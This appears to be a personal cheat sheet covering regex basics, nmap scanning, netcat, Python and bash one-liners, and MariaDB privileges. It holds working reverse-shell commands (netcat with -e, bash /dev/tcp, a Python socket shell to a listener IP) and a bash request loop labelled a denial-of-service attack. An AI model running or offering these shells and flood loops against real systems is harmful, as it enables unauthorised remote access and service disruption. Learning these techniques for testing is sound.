# Basic of REGEX
. - Any one character
* - Match any number of previous (including 0)
+ - Match any number of previous
$ - End of the line
^ - Begining og the line
\S - any non-whitespace character
\s - any whitespace character
? - optional
[a-z] - any lovercase letter
[A-Z] - any uppercase letter
[A-Za-z] - any letter
[0-9] - any number

\ - escape something


# _____ ___   ___  _         
#|_   _/ _ \ / _ \| |    ___ 
#  | || | | | | | | |   / __|
#  | || |_| | |_| | |___\__ \
#  |_| \___/ \___/|_____|___/
#

#
# NMAP
#

# slow rate nmap scan for newtork devices,
# can detect android devices connected to the wifi
# this one also scann all ports: -p-
nmap --max-rate 100 -p- 192.168.0.1/24

#
# NetCat
#

# netcat simple terminal reverse shell on same network
# 1st PC:
nc -lvnp $PORT -e /bin/sh # usualy 4444 becouse it's probably free
# 2nd PC:
nc $LISTENERS_IP $PORT # for unix/linux
nc.exe $LISTENERS_IP $PORT -e cmd.exe     # for Windows

# simple netcat reverse shell
# 1st PC:
nc -lvnp $PORT # again, attacker needs to listen to the open port
# 2nd PC without nc:
bash -i >& /dev/tcp/$LISTENERS_IP/$PORT 0>&1

# reverse shell is possible with any programming language
# here is python example in one line:
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.113”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
# there are examples on this site:
# https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/
# netcat can also be used as a terminal chad
# 1st PC listen:
nc -lvnp $PORT
# 2nd PC send
nc $LISTENERS_IP $PORT
# trafic work and sends both ways

# ____        _   _                 
#|  _ \ _   _| |_| |__   ___  _ __  
#| |_) | | | | __| '_ \ / _ \| '_ \ 
#|  __/| |_| | |_| | | | (_) | | | |
#|_|    \__, |\__|_| |_|\___/|_| |_|
#       |___/                       
#

# simple python server
python -m http.server
# nice for transvering files over network 
# and testing uses, not secured
# not installed by default, need:
python3 -m pip install websocket-client
python3 -m pip install simple_http_server

# python IDLE execute shell commands
>>> import os
>>> os.system('whoami')


# ____    _    ____  _   _ 
#| __ )  / \  / ___|| | | |
#|  _ \ / _ \ \___ \| |_| |
#| |_) / ___ \ ___) |  _  |
#|____/_/   \_\____/|_| |_|
#

# one line port scanner in bash
# set on localhost
for i in {1..65535};do (echo </dev/tcp/127.0.0.1/$i) &>/dev/null && echo -e "\n[+] Open port at:\t$i" || echo -n ".";done

# simple web service DOS attack from bash one-line
for i in {1..999999}; do wget http://0.0.0.0:8000/; echo "[+] Request no: $i"; rm -rf index.html;done

#           _ 
# ___  __ _| |
#/ __|/ _` | |
#\__ \ (_| | |
#|___/\__, |_|
#        |_|  
#

# backup/extract data from mariadb/mysql
# need DB user password to be executed
mysqldump -u $USERNAME -h $SERVER_IP -p $TABLE_NAME >> $FILE_NAME


# MariaDB Permisions/Privileges
SHOW PRIVILEGES;
+--------------------------+---------------------------------------+--------------------------------------------------------------------+
| Privilege                | Context                               | Comment                                                            |
+--------------------------+---------------------------------------+--------------------------------------------------------------------+
| Alter                    | Tables                                | To alter the table                                                 |
| Alter routine            | Functions,Procedures                  | To alter or drop stored functions/procedures                       |
| Create                   | Databases,Tables,Indexes              | To create new databases and tables                                 |
| Create routine           | Databases                             | To use CREATE FUNCTION/PROCEDURE                                   |
| Create temporary tables  | Databases                             | To use CREATE TEMPORARY TABLE                                      |
| Create view              | Tables                                | To create new views                                                |
| Create user              | Server Admin                          | To create new users                                                |
| Delete                   | Tables                                | To delete existing rows                                            |
| Delete history           | Tables                                | To delete versioning table historical rows                         |
| Drop                     | Databases,Tables                      | To drop databases, tables, and views                               |
| Event                    | Server Admin                          | To create, alter, drop and execute events                          |
| Execute                  | Functions,Procedures                  | To execute stored routines                                         |
| File                     | File access on server                 | To read and write files on the server                              |
| Grant option             | Databases,Tables,Functions,Procedures | To give to other users those privileges you possess                |
| Index                    | Tables                                | To create or drop indexes                                          |
| Insert                   | Tables                                | To insert data into tables                                         |
| Lock tables              | Databases                             | To use LOCK TABLES (together with SELECT privilege)                |
| Process                  | Server Admin                          | To view the plain text of currently executing queries              |
| Proxy                    | Server Admin                          | To make proxy user possible                                        |
| References               | Databases,Tables                      | To have references on tables                                       |
| Reload                   | Server Admin                          | To reload or refresh tables, logs and privileges                   |
| Binlog admin             | Server                                | To purge binary logs                                               |
| Binlog monitor           | Server                                | To use SHOW BINLOG STATUS and SHOW BINARY LOG                      |
| Binlog replay            | Server                                | To use BINLOG (generated by mariadb-binlog)                        |
| Replication master admin | Server                                | To monitor connected slaves                                        |
| Replication slave admin  | Server                                | To start/stop slave and apply binlog events                        |
| Slave monitor            | Server                                | To use SHOW SLAVE STATUS and SHOW RELAYLOG EVENTS                  |
| Replication slave        | Server Admin                          | To read binary log events from the master                          |
| Select                   | Tables                                | To retrieve rows from table                                        |
| Show databases           | Server Admin                          | To see all databases with SHOW DATABASES                           |
| Show view                | Tables                                | To see views with SHOW CREATE VIEW                                 |
| Shutdown                 | Server Admin                          | To shut down the server                                            |
| Super                    | Server Admin                          | To use KILL thread, SET GLOBAL, CHANGE MASTER, etc.                |
| Trigger                  | Tables                                | To use triggers                                                    |
| Create tablespace        | Server Admin                          | To create/alter/drop tablespaces                                   |
| Update                   | Tables                                | To update existing rows                                            |
| Set user                 | Server                                | To create views and stored routines with a different definer       |
| Federated admin          | Server                                | To execute the CREATE SERVER, ALTER SERVER, DROP SERVER statements |
| Connection admin         | Server                                | To bypass connection limits and kill other users' connections      |
| Read_only admin          | Server                                | To perform write operations even if @@read_only=ON                 |
| Usage                    | Server Admin                          | No privileges - allow connect only                                 |
+--------------------------+---------------------------------------+--------------------------------------------------------------------+
41 rows in set (0.000 sec)
